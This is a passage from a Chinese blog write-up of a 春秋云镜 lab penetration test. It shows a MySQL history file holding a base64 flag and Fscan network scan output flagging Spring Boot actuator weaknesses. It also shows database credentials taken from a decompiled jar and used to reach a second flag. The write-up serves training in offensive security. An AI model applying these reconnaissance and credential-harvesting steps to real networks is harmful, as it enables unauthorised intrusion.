<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="ln"> 1</span><span class="cl">root@ubuntu-k8s:~# cat .mysql_history
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">_HiStOrY_V2_
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">show<span class="se">\0</span>40databases<span class="p">;</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">create<span class="se">\0</span>40database<span class="se">\0</span>40flaghaha<span class="p">;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">use<span class="se">\0</span>40flaghaha
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">DROP<span class="se">\0</span>40TABLE<span class="se">\0</span>40IF<span class="se">\0</span>40EXISTS<span class="se">\0</span>40<span class="sb">`</span>f1ag<span class="sb">`</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">CREATE<span class="se">\0</span>40TABLE<span class="se">\0</span>40<span class="sb">`</span>flag06<span class="sb">`</span><span class="se">\0</span>40<span class="o">(</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="sb">`</span>id<span class="sb">`</span><span class="se">\0</span>40int<span class="se">\0</span>40DEFAULT<span class="se">\0</span>40NULL,
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="se">\0</span>40<span class="se">\0</span>40<span class="sb">`</span>f1agggggishere<span class="sb">`</span><span class="se">\0</span>40varchar<span class="o">(</span>255<span class="o">)</span><span class="se">\0</span>40DEFAULT<span class="se">\0</span>40NULL
</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="o">)</span><span class="se">\0</span>40ENGINE<span class="o">=</span>MyISAM<span class="se">\0</span>40DEFAULT<span class="se">\0</span>40CHARSET<span class="o">=</span>utf8<span class="p">;</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">CREATE<span class="se">\0</span>40TABLE<span class="se">\0</span>40<span class="sb">`</span>flag06<span class="sb">`</span><span class="se">\0</span>40<span class="o">(</span><span class="se">\0</span>40<span class="sb">`</span>id<span class="sb">`</span><span class="se">\0</span>40int<span class="se">\0</span>40DEFAULT<span class="se">\0</span>40NULL,<span class="se">\0</span>40<span class="se">\0</span>40<span class="se">\0</span>40<span class="sb">`</span>f1agggggishere<span class="sb">`</span><span class="se">\0</span>40varchar<span class="o">(</span>255<span class="o">)</span><span class="se">\0</span>40DEFAULT<span class="se">\0</span>40NULL<span class="se">\0</span>40<span class="o">)</span><span class="se">\0</span>40ENGINE<span class="o">=</span>MyISAM<span class="se">\0</span>40DEFAULT<span class="se">\0</span>40CHARSET<span class="o">=</span>utf8<span class="p">;</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">show<span class="se">\0</span>40tables<span class="p">;</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">drop<span class="se">\0</span>40table<span class="se">\0</span>40flag06<span class="p">;</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">DROP<span class="se">\0</span>40TABLE<span class="se">\0</span>40IF<span class="se">\0</span>40EXISTS<span class="se">\0</span>40<span class="sb">`</span>f1ag<span class="sb">`</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">CREATE<span class="se">\0</span>40TABLE<span class="se">\0</span>40<span class="sb">`</span>flag04<span class="sb">`</span><span class="se">\0</span>40<span class="o">(</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="sb">`</span>id<span class="sb">`</span><span class="se">\0</span>40int<span class="se">\0</span>40DEFAULT<span class="se">\0</span>40NULL,
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="se">\0</span>40<span class="se">\0</span>40<span class="sb">`</span>f1agggggishere<span class="sb">`</span><span class="se">\0</span>40varchar<span class="o">(</span>255<span class="o">)</span><span class="se">\0</span>40DEFAULT<span class="se">\0</span>40NULL
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="o">)</span><span class="se">\0</span>40ENGINE<span class="o">=</span>MyISAM<span class="se">\0</span>40DEFAULT<span class="se">\0</span>40CHARSET<span class="o">=</span>utf8<span class="p">;</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">CREATE<span class="se">\0</span>40TABLE<span class="se">\0</span>40<span class="sb">`</span>flag04<span class="sb">`</span><span class="se">\0</span>40<span class="o">(</span><span class="se">\0</span>40<span class="sb">`</span>id<span class="sb">`</span><span class="se">\0</span>40int<span class="se">\0</span>40DEFAULT<span class="se">\0</span>40NULL,<span class="se">\0</span>40<span class="se">\0</span>40<span class="se">\0</span>40<span class="sb">`</span>f1agggggishere<span class="sb">`</span><span class="se">\0</span>40varchar<span class="o">(</span>255<span class="o">)</span><span class="se">\0</span>40DEFAULT<span class="se">\0</span>40NULL<span class="se">\0</span>40<span class="o">)</span><span class="se">\0</span>40ENGINE<span class="o">=</span>MyISAM<span class="se">\0</span>40DEFAULT<span class="se">\0</span>40CHARSET<span class="o">=</span>utf8<span class="p">;</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">INSERT<span class="se">\0</span>40INTO<span class="se">\0</span>40<span class="sb">`</span>flag<span class="sb">`</span><span class="se">\0</span>40VALUES<span class="se">\0</span>40<span class="o">(</span>1,<span class="se">\0</span>40<span class="s1">&#39;ZmxhZ3tkYTY5YzQ1OS03ZmU1LTQ1MzUtYjhkMS0xNWZmZjQ5NmEyOWZ9Cg==&#39;</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">INSERT<span class="se">\0</span>40INTO<span class="se">\0</span>40<span class="sb">`</span>flag04<span class="sb">`</span><span class="se">\0</span>40VALUES<span class="se">\0</span>40<span class="o">(</span>1,<span class="se">\0</span>40<span class="s1">&#39;ZmxhZ3tkYTY5YzQ1OS03ZmU1LTQ1MzUtYjhkMS0xNWZmZjQ5NmEyOWZ9Cg==&#39;</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="nb">exit</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">show<span class="se">\0</span>40tables
</span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="p">;</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">database<span class="o">()</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="k">select</span><span class="se">\0</span>40datebase<span class="o">()</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">show<span class="se">\0</span>40databases<span class="p">;</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">quit
</span></span></code></pre></div><p>看到flag04，base64解码后拿到flag</p>
<p><img alt="image-20250522193658783" loading="lazy" src="../assets/image-20250522193658783.png"></p>
<pre tabindex="0"><code>flag{da69c459-7fe5-4535-b8d1-15fff496a29f}
</code></pre><h3 id="分支二-1722210024">分支二 [172.22.10.0/24]<a hidden class="anchor" aria-hidden="true" href="#分支二-1722210024">#</a></h3>
<p>信息收集一手</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="ln"> 1</span><span class="cl">┌──────────────────────────────────────────────┐
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">│    ___                              _        │
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">│   / _ <span class="se">\ </span>    ___  ___ _ __ __ _  ___<span class="p">|</span> <span class="p">|</span> __    │
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">│  / /_<span class="se">\/</span>____/ __<span class="p">|</span>/ __<span class="p">|</span> <span class="err">&#39;</span>__/ _<span class="sb">`</span> <span class="p">|</span>/ __<span class="p">|</span> <span class="p">|</span>/ /    │
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">│ / /_<span class="se">\\</span>_____<span class="se">\_</span>_ <span class="se">\ </span><span class="o">(</span>__<span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="o">(</span>_<span class="p">|</span> <span class="p">|</span> <span class="o">(</span>__<span class="p">|</span>   &lt;     │
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">│ <span class="se">\_</span>___/     <span class="p">|</span>___/<span class="se">\_</span>__<span class="p">|</span>_<span class="p">|</span>  <span class="se">\_</span>_,_<span class="p">|</span><span class="se">\_</span>__<span class="p">|</span>_<span class="p">|</span><span class="se">\_\ </span>   │
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">└──────────────────────────────────────────────┘
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">      Fscan Version: 2.0.0
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">
</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="o">[</span>2025-05-22 18:02:37<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> 暴力破解线程数: <span class="m">1</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="o">[</span>2025-05-22 18:02:37<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> 开始信息扫描
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="o">[</span>2025-05-22 18:02:37<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> CIDR范围: 172.22.10.0-172.22.10.255
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="o">[</span>2025-05-22 18:02:37<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> 生成IP范围: 172.22.10.0.%!d<span class="o">(</span><span class="nv">string</span><span class="o">=</span>172.22.10.255<span class="o">)</span> - %!s<span class="o">(</span>MISSING<span class="o">)</span>.%!d<span class="o">(</span>MISSING<span class="o">)</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="o">[</span>2025-05-22 18:02:37<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> 解析CIDR 172.22.10.0/24 -&gt; IP范围 172.22.10.0-172.22.10.255
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="o">[</span>2025-05-22 18:02:37<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> 最终有效主机数量: <span class="m">256</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="o">[</span>2025-05-22 18:02:37<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> 开始主机扫描
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="o">[</span>2025-05-22 18:02:37<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> 正在尝试无监听ICMP探测...
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="o">[</span>2025-05-22 18:02:37<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> 当前用户权限不足,无法发送ICMP包
</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="o">[</span>2025-05-22 18:02:37<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> 切换为PING方式探测...
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="o">[</span>2025-05-22 18:02:37<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 目标 172.22.10.28    存活 <span class="o">(</span>ICMP<span class="o">)</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="o">[</span>2025-05-22 18:02:37<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 目标 172.22.10.16    存活 <span class="o">(</span>ICMP<span class="o">)</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="o">[</span>2025-05-22 18:02:43<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> 存活主机数量: <span class="m">2</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="o">[</span>2025-05-22 18:02:43<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> 有效端口数量: <span class="m">233</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="o">[</span>2025-05-22 18:02:43<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 端口开放 172.22.10.28:80
</span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="o">[</span>2025-05-22 18:02:43<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 端口开放 172.22.10.16:22
</span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="o">[</span>2025-05-22 18:02:43<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 端口开放 172.22.10.28:22
</span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="o">[</span>2025-05-22 18:02:43<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 端口开放 172.22.10.28:3306
</span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="o">[</span>2025-05-22 18:02:43<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 端口开放 172.22.10.16:8080
</span></span><span class="line"><span class="ln">29</span><span class="cl"><span class="o">[</span>2025-05-22 18:02:43<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 服务识别 172.22.10.16:22 <span class="o">=</span>&gt; <span class="o">[</span>ssh<span class="o">]</span> 版本:8.2p1 Ubuntu 4ubuntu0.10 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux<span class="p">;</span> protocol 2.0 Banner:<span class="o">[</span>SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.10.<span class="o">]</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl"><span class="o">[</span>2025-05-22 18:02:43<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 服务识别 172.22.10.28:22 <span class="o">=</span>&gt; <span class="o">[</span>ssh<span class="o">]</span> 版本:8.2p1 Ubuntu 4ubuntu0.10 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux<span class="p">;</span> protocol 2.0 Banner:<span class="o">[</span>SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.10.<span class="o">]</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl"><span class="o">[</span>2025-05-22 18:02:44<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 服务识别 172.22.10.28:3306 <span class="o">=</span>&gt; <span class="o">[</span>mysql<span class="o">]</span> 版本:8.0.36-0ubuntu0.20.04.1 产品:MySQL Banner:<span class="o">[[</span>.8.0.36-0ubuntu0.20.04.1.Gg-d<span class="p">|</span>iR.N? / lIT1<span class="o">{</span>L/ caching_sha2_password<span class="o">]</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl"><span class="o">[</span>2025-05-22 18:02:48<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 服务识别 172.22.10.28:80 <span class="o">=</span>&gt; <span class="o">[</span>http<span class="o">]</span> 版本:1.25.4 产品:nginx
</span></span><span class="line"><span class="ln">33</span><span class="cl"><span class="o">[</span>2025-05-22 18:02:49<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 服务识别 172.22.10.16:8080 <span class="o">=</span>&gt; <span class="o">[</span>http<span class="o">]</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl"><span class="o">[</span>2025-05-22 18:02:49<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> 存活端口数量: <span class="m">5</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl"><span class="o">[</span>2025-05-22 18:02:49<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> 开始漏洞扫描
</span></span><span class="line"><span class="ln">36</span><span class="cl"><span class="o">[</span>2025-05-22 18:02:49<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> 加载的插件: mysql, ssh, webpoc, webtitle
</span></span><span class="line"><span class="ln">37</span><span class="cl"><span class="o">[</span>2025-05-22 18:02:49<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 网站标题 http://172.22.10.16:8080  状态码:302 长度:0      标题:无标题 重定向地址: http://172.22.10.16:8080/login<span class="p">;</span><span class="nv">jsessionid</span><span class="o">=</span>AC616F35E04329FCD36FCA388CB10817
</span></span><span class="line"><span class="ln">38</span><span class="cl"><span class="o">[</span>2025-05-22 18:02:49<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 网站标题 http://172.22.10.28       状态码:200 长度:1975   标题:DooTask
</span></span><span class="line"><span class="ln">39</span><span class="cl"><span class="o">[</span>2025-05-22 18:02:49<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 网站标题 http://172.22.10.16:8080/login<span class="p">;</span><span class="nv">jsessionid</span><span class="o">=</span>AC616F35E04329FCD36FCA388CB10817 状态码:200 长度:3860   标题:智联科技 ERP 后台登陆
</span></span><span class="line"><span class="ln">40</span><span class="cl"><span class="o">[</span>2025-05-22 18:02:50<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 目标: http://172.22.10.16:8080
</span></span><span class="line"><span class="ln">41</span><span class="cl">  漏洞类型: poc-yaml-spring-actuator-heapdump-file
</span></span><span class="line"><span class="ln">42</span><span class="cl">  漏洞名称: 
</span></span><span class="line"><span class="ln">43</span><span class="cl">  详细信息:
</span></span><span class="line"><span class="ln">44</span><span class="cl">        author:AgeloVito
</span></span><span class="line"><span class="ln">45</span><span class="cl">        links:https://www.cnblogs.com/wyb628/p/8567610.html
</span></span><span class="line"><span class="ln">46</span><span class="cl"><span class="o">[</span>2025-05-22 18:02:50<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 目标: http://172.22.10.16:8080
</span></span><span class="line"><span class="ln">47</span><span class="cl">  漏洞类型: poc-yaml-springboot-env-unauth
</span></span><span class="line"><span class="ln">48</span><span class="cl">  漏洞名称: spring2
</span></span><span class="line"><span class="ln">49</span><span class="cl">  详细信息:
</span></span><span class="line"><span class="ln">50</span><span class="cl">        links:https://github.com/LandGrey/SpringBootVulExploit
</span></span><span class="line"><span class="ln">51</span><span class="cl"><span class="o">[</span>2025-05-22 18:09:13<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 扫描已完成: 7/7
</span></span></code></pre></div><p>扫出来一台机子</p>
<pre tabindex="0"><code>[2025-05-22 18:02:37] [SUCCESS] 目标 172.22.10.28    存活 (ICMP)
</code></pre><p>开放了80，22和3306端口</p>
<h4 id="dootask">DooTask<a hidden class="anchor" aria-hidden="true" href="#dootask">#</a></h4>
<p>在Harbor的project/projectadmin镜像中有可以找到服务的jar包</p>
<p><img alt="image-20250522183204595" loading="lazy" src="../assets/image-20250522183204595.png"></p>
<p>反编译后在application.properties中可以找到关于mysql的配置文件</p>
<p><img alt="image-20250522183619872" loading="lazy" src="../assets/image-20250522183619872.png"></p>
<p>可以看到数据库地址就是这台机子</p>
<p>MDUT一把梭拿到flag</p>
<p><img alt="image-20250522184006046" loading="lazy" src="../assets/image-20250522184006046.png"></p>
<pre tabindex="0"><code>flag06: flag{413ac6ad-1d50-47cb-9cf3-17354b751741}
</code></pre>

  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="http://localhost:1313/tags/writeup/">Writeup</a></li>
      <li><a href="http://localhost:1313/tags/%E6%B8%97%E9%80%8F/">渗透</a></li>
      <li><a href="http://localhost:1313/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/">春秋云镜</a></li>
    </ul>
<nav class="paginav">
  <a class="prev" href="http://localhost:1313/post/d3ctf_2025/">
    <span class="title">« 上一页</span>
    <br>
    <span>D^3CTF-2025-Web-Writeup</span>
  </a>
  <a class="next" href="http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-%E7%BD%91%E9%BC%8E2022%E5%A4%8D%E7%9B%98-writeup/">
    <span class="title">下一页 »</span>
    <br>
    <span>春秋云镜-网鼎2022半决复盘-Writeup</span>
  </a>
</nav>

  </footer><div id="tw-comment"></div>
<script>
    
    const getStoredTheme = () => localStorage.getItem("pref-theme") === "light" ? "light" : "dark";
    const setGiscusTheme = () => {
        const sendMessage = (message) => {
            const iframe = document.querySelector('iframe.giscus-frame');
            if (iframe) {
                iframe.contentWindow.postMessage({giscus: message}, 'https://giscus.app');
            }
        }
        sendMessage({setConfig: {theme: getStoredTheme()}})
    }

    document.addEventListener("DOMContentLoaded", () => {
        const giscusAttributes = {
            "src": "https://giscus.app/client.js",
            "data-repo": "sonnycalcr\/sonnycalcr.github.io",
            "data-repo-id": "xxxxxx",
            "data-category": "Announcements",
            "data-category-id": "xxxxx",
            "data-mapping": "pathname",
            "data-strict": "0",
            "data-reactions-enabled": "1",
            "data-emit-metadata": "0",
            "data-input-position": "bottom",
            "data-theme": getStoredTheme(),
            "data-lang": "zh-CN",
            "data-loading": "lazy",
            "crossorigin": "anonymous",
        };

        
        const giscusScript = document.createElement("script");
        Object.entries(giscusAttributes).forEach(
                ([key, value]) => giscusScript.setAttribute(key, value));
        document.querySelector("#tw-comment").appendChild(giscusScript);

        
        const themeSwitcher = document.querySelector("#theme-toggle");
        if (themeSwitcher) {
            themeSwitcher.addEventListener("click", setGiscusTheme);
        }
        const themeFloatSwitcher = document.querySelector("#theme-toggle-float");
        if (themeFloatSwitcher) {
            themeFloatSwitcher.addEventListener("click", setGiscusTheme);
        }
    });
</script>
</article>
    </main>
    
<footer class="footer">
        <span><a href="https://blog.xrntkk.top/">©2024 Xrntkk&rsquo;s Blog</a></span> · 


    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
    <div class="busuanzi-footer">
    <span id="busuanzi_container_site_pv">
        Total Visits: <span id="busuanzi_value_site_pv"></span> & 
    </span>
    <span id="busuanzi_container_site_uv">
        Unique Visitor: <span id="busuanzi_value_site_uv"></span>
    </span>
    </div></footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = '复制';

        function copyingDone() {
            copybutton.innerHTML = '已复制！';
            setTimeout(() => {
                copybutton.innerHTML = '复制';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
